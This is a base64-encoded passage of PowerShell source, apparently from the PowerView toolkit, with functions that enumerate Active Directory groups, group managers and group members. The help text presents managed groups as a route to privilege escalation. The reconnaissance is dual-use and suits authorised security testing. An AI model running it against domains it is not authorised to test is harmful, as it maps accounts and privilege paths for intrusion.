ICAkR3JvdXAuU2FtQWNjb3VudE5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydOYW1lJ10pIHsKICAgICAgICAgICAgJEdyb3VwLk5hbWUgPSAkTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwLk5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEaXNwbGF5TmFtZSddKSB7CiAgICAgICAgICAgICRHcm91cC5EaXNwbGF5TmFtZSA9ICREaXNwbGF5TmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwLkRpc3BsYXlOYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0Rlc2NyaXB0aW9uJ10pIHsKICAgICAgICAgICAgJEdyb3VwLkRlc2NyaXB0aW9uID0gJERlc2NyaXB0aW9uCiAgICAgICAgfQoKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LURvbWFpbkdyb3VwXSBBdHRlbXB0aW5nIHRvIGNyZWF0ZSBncm91cCAnJFNhbUFjY291bnROYW1lJyIKICAgICAgICB0cnkgewogICAgICAgICAgICAkTnVsbCA9ICRHcm91cC5TYXZlKCkKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1Eb21haW5Hcm91cF0gR3JvdXAgJyRTYW1BY2NvdW50TmFtZScgc3VjY2Vzc2Z1bGx5IGNyZWF0ZWQiCiAgICAgICAgICAgICRHcm91cAogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltOZXctRG9tYWluR3JvdXBdIEVycm9yIGNyZWF0aW5nIGdyb3VwICckU2FtQWNjb3VudE5hbWUnIDogJF8iCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbk1hbmFnZWRTZWN1cml0eUdyb3VwIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIGFsbCBzZWN1cml0eSBncm91cHMgaW4gdGhlIGN1cnJlbnQgKG9yIHRhcmdldCkgZG9tYWluIHRoYXQgaGF2ZSBhIG1hbmFnZXIgc2V0LgoKQXV0aG9yOiBTdHVhcnQgTW9yZ2FuIChAdWtzdHVmdXMpIDxzdHVhcnQubW9yZ2FuQG13cmluZm9zZWN1cml0eS5jb20+LCBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluT2JqZWN0LCBHZXQtRG9tYWluR3JvdXAsIEdldC1Eb21haW5PYmplY3RBY2wgIAoKLkRFU0NSSVBUSU9OCgpBdXRob3JpdHkgdG8gbWFuaXB1bGF0ZSB0aGUgZ3JvdXAgbWVtYmVyc2hpcCBvZiBBRCBzZWN1cml0eSBncm91cHMgYW5kIGRpc3RyaWJ1dGlvbiBncm91cHMKY2FuIGJlIGRlbGVnYXRlZCB0byBub24tYWRtaW5pc3RyYXRvcnMgYnkgc2V0dGluZyB0aGUgJ21hbmFnZWRCeScgYXR0cmlidXRlLiBUaGlzIGlzIHR5cGljYWxseQp1c2VkIHRvIGRlbGVnYXRlIG1hbmFnZW1lbnQgYXV0aG9yaXR5IHRvIGRpc3RyaWJ1dGlvbiBncm91cHMsIGJ1dCBXaW5kb3dzIHN1cHBvcnRzIHNlY3VyaXR5IGdyb3VwcwpiZWluZyBtYW5hZ2VkIGluIHRoZSBzYW1lIHdheS4KClRoaXMgZnVuY3Rpb24gc2VhcmNoZXMgZm9yIEFEIGdyb3VwcyB3aGljaCBoYXZlIGEgZ3JvdXAgbWFuYWdlciBzZXQsIGFuZCBkZXRlcm1pbmVzIHdoZXRoZXIgdGhhdAp1c2VyIGNhbiBtYW5pcHVsYXRlIGdyb3VwIG1lbWJlcnNoaXAuIFRoaXMgY291bGQgYmUgYSB1c2VmdWwgbWV0aG9kIG9mIGhvcml6b250YWwgcHJpdmlsZWdlCmVzY2FsYXRpb24sIGVzcGVjaWFsbHkgaWYgdGhlIG1hbmFnZXIgY2FuIG1hbmlwdWxhdGUgdGhlIG1lbWJlcnNoaXAgb2YgYSBwcml2aWxlZ2VkIGdyb3VwLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5NYW5hZ2VkU2VjdXJpdHlHcm91cCB8IEV4cG9ydC1Qb3dlclZpZXdDU1YgLU5vVHlwZUluZm9ybWF0aW9uIGdyb3VwLW1hbmFnZXJzLmNzdgoKU3RvcmUgYSBsaXN0IG9mIGFsbCBzZWN1cml0eSBncm91cHMgd2l0aCBtYW5hZ2VycyBpbiBncm91cC1tYW5hZ2Vycy5jc3YKCi5PVVRQVVRTCgpQb3dlclZpZXcuTWFuYWdlZFNlY3VyaXR5R3JvdXAKCkEgY3VzdG9tIFBTT2JqZWN0IGRlc2NyaWJpbmcgdGhlIG1hbmFnZWQgc2VjdXJpdHkgZ3JvdXAuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTWFuYWdlZFNlY3VyaXR5R3JvdXAnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnTERBUEZpbHRlcicgPSAnKCYobWFuYWdlZEJ5PSopKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yMTQ3NDgzNjQ4KSknCiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkaXN0aW5ndWlzaGVkTmFtZSxtYW5hZ2VkQnksc2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW4KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRW52OlVTRVJETlNET01BSU4KICAgICAgICB9CgogICAgICAgICMgZ28gdGhyb3VnaCB0aGUgbGlzdCBvZiBzZWN1cml0eSBncm91cHMgb24gdGhlIGRvbWFpbiBhbmQgaWRlbnRpZnkgdGhvc2Ugd2hvIGhhdmUgYSBtYW5hZ2VyCiAgICAgICAgR2V0LURvbWFpbkdyb3VwIEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAnZGlzdGluZ3Vpc2hlZG5hbWUsbmFtZSxzYW1hY2NvdW50dHlwZSxzYW1hY2NvdW50bmFtZSxvYmplY3RzaWQnCiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRfLm1hbmFnZWRCeQogICAgICAgICAgICAkTnVsbCA9ICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ0xEQVBGaWx0ZXInKQoKICAgICAgICAgICAgIyAkU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgIyByZXRyaWV2ZSB0aGUgb2JqZWN0IHRoYXQgdGhlIG1hbmFnZWRCeSBETiByZWZlcnMgdG8KICAgICAgICAgICAgJEdyb3VwTWFuYWdlciA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICMgV3JpdGUtSG9zdCAiR3JvdXBNYW5hZ2VyOiAkR3JvdXBNYW5hZ2VyIgogICAgICAgICAgICAkTWFuYWdlZEdyb3VwID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgJF8uc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgJE1hbmFnZWRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERpc3Rpbmd1aXNoZWROYW1lJyAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01hbmFnZXJOYW1lJyAkR3JvdXBNYW5hZ2VyLnNhbWFjY291bnRuYW1lCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlckRpc3Rpbmd1aXNoZWROYW1lJyAkR3JvdXBNYW5hZ2VyLmRpc3Rpbmd1aXNoZWROYW1lCgogICAgICAgICAgICAjIGRldGVybWluZSB3aGV0aGVyIHRoZSBtYW5hZ2VyIGlzIGEgdXNlciBvciBhIGdyb3VwCiAgICAgICAgICAgIGlmICgkR3JvdXBNYW5hZ2VyLnNhbWFjY291bnR0eXBlIC1lcSAweDEwMDAwMDAwKSB7CiAgICAgICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01hbmFnZXJUeXBlJyAnR3JvdXAnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBNYW5hZ2VyLnNhbWFjY291bnR0eXBlIC1lcSAweDMwMDAwMDAwKSB7CiAgICAgICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01hbmFnZXJUeXBlJyAnVXNlcicKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJEFDTEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnSWRlbnRpdHknID0gJF8uZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICdSaWdodHNGaWx0ZXInID0gJ1dyaXRlTWVtYmVycycKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQUNMQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkQUNMQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkQUNMQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFDTEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAgICAgIyAjIFRPRE86IGNvcnJlY3QhCiAgICAgICAgICAgICMgIyBmaW5kIHRoZSBBQ0xzIHRoYXQgcmVsYXRlIHRvIHRoZSBhYmlsaXR5IHRvIHdyaXRlIHRvIHRoZSBncm91cAogICAgICAgICAgICAjICR4YWNsID0gR2V0LURvbWFpbk9iamVjdEFjbCBAQUNMQXJndW1lbnRzIC1WZXJib3NlCiAgICAgICAgICAgICMgIyAkQUNMQXJndW1lbnRzCiAgICAgICAgICAgICMgIyBkb3VibGUtY2hlY2sgdGhhdCB0aGUgbWFuYWdlcgogICAgICAgICAgICAjIGlmICgkeGFjbC5PYmplY3RUeXBlIC1lcSAnYmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUyJyAtYW5kICR4YWNsLkFjZVR5cGUgLWVxICdBY2Nlc3NBbGxvd2VkJyAtYW5kICgkeGFjbC5PYmplY3RTaWQgLWVxICRHcm91cE1hbmFnZXIub2JqZWN0c2lkKSkgewogICAgICAgICAgICAjICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01hbmFnZXJDYW5Xcml0ZScgJFRydWUKICAgICAgICAgICAgIyB9CiAgICAgICAgICAgICMgZWxzZSB7CiAgICAgICAgICAgICMgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlckNhbldyaXRlJyAkRmFsc2UKICAgICAgICAgICAgIyB9CgogICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01hbmFnZXJDYW5Xcml0ZScgJ1VOS05PV04nCgogICAgICAgICAgICAkTWFuYWdlZEdyb3VwLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5NYW5hZ2VkU2VjdXJpdHlHcm91cCcpCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluR3JvdXBNZW1iZXIgewo8IwouU1lOT1BTSVMKClJldHVybiB0aGUgbWVtYmVycyBvZiBhIHNwZWNpZmljIGRvbWFpbiBncm91cC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBHZXQtRG9tYWluR3JvdXAsIEdldC1Eb21haW5Hcm91cE1lbWJlciwgQ29udmVydC1BRE5hbWUsIEdldC1Eb21haW5PYmplY3QsIENvbnZlcnRGcm9tLVNJRCAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIHRoZSBzcGVjaWZpZWQKZ3JvdXAgbWF0Y2hpbmcgdGhlIGNyaXRlcmlhLiBFYWNoIHJlc3VsdCBpcyB0aGVuIHJlYm91bmQgYW5kIHRoZSBmdWxsIHVzZXIKb3IgZ3JvdXAgb2JqZWN0IGlzIHJldHVybmVkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBHcm91cDEpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1ncm91cDEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTQpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMikKc3BlY2lmeWluZyB0aGUgZ3JvdXAgdG8gcXVlcnkgZm9yLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgUmVjdXJzZQoKU3dpdGNoLiBJZiB0aGUgZ3JvdXAgbWVtYmVyIGlzIGEgZ3JvdXAsIHJlY3Vyc2l2ZWx5IHRyeSB0byBxdWVyeSBpdHMgbWVtYmVycyBhcyB3ZWxsLgoKLlBBUkFNRVRFUiBSZWN1cnNlVXNpbmdNYXRjaGluZ1J1bGUKClN3aXRjaC4gVXNlIExEQVBfTUFUQ0hJTkdfUlVMRV9JTl9DSEFJTiBpbiB0aGUgTERBUCBzZWFyY2ggcXVlcnkgdG8gcmVjdXJzZS4KTXVjaCBmYXN0ZXIgdGhhbiBtYW51YWwgcmVjdXJzaW9uLCBidXQgZG9lc24ndCByZXZlYWwgY3Jvc3MtZG9tYWluIGdyb3VwcywKYW5kIG9ubHkgcmV0dXJucyB1c2VyIGFjY291bnRzIChubyBuZXN0ZWQgZ3JvdXAgb2JqZWN0cyB0aGVtc2VsdmVzKS4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBTZWN1cml0eU1hc2tzCgpTcGVjaWZpZXMgYW4gb3B0aW9uIGZvciBleGFtaW5pbmcgc2VjdXJpdHkgaW5mb3JtYXRpb24gb2YgYSBkaXJlY3Rvcnkgb2JqZWN0LgpPbmUgb2YgJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkdyb3VwTWVtYmVyICJEZXNrdG9wIEFkbWlucyIKCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApHcm91cE5hbWUgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049RGVza3RvcCBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJEb21haW4gICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKTWVtYmVyTmFtZSAgICAgICAgICAgICAgOiBUZXN0aW5nIEdyb3VwCk1lbWJlckRpc3Rpbmd1aXNoZWROYW1lIDogQ049VGVzdGluZyBHcm91cCxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlck9iamVjdENsYXNzICAgICAgIDogZ3JvdXAKTWVtYmVyU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMjkKCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApHcm91cE5hbWUgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049RGVza3RvcCBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJEb21haW4gICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKTWVtYmVyTmFtZSAgICAgICAgICAgICAgOiBhcm9iYmlucy5hCk1lbWJlckRpc3Rpbmd1aXNoZWROYW1lIDogQ049QW5keSBSb2JiaW5zIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJPYmplY3RDbGFzcyAgICAgICA6IHVzZXIKTWVtYmVyU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTIKCi5FWEFNUExFCgonRGVza3RvcCBBZG1pbnMnIHwgR2V0LURvbWFpbkdyb3VwTWVtYmVyIC1SZWN1cnNlCgpHcm91cERvbWFpbiAgICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKR3JvdXBOYW1lICAgICAgICAgICAgICAgOiBEZXNrdG9wIEFkbWlucwpHcm91cERpc3Rpbmd1aXNoZWROYW1lICA6IENOPURlc2t0b3AgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyRG9tYWluICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCk1lbWJlck5hbWUgICAgICAgICAgICAgIDogVGVzdGluZyBHcm91cApNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZSA6IENOPVRlc3RpbmcgR3JvdXAsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJPYmplY3RDbGFzcyAgICAgICA6IGdyb3VwCk1lbWJlclNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTI5CgpHcm91cERvbWFpbiAgICAgICAgICAgICA6IHRlc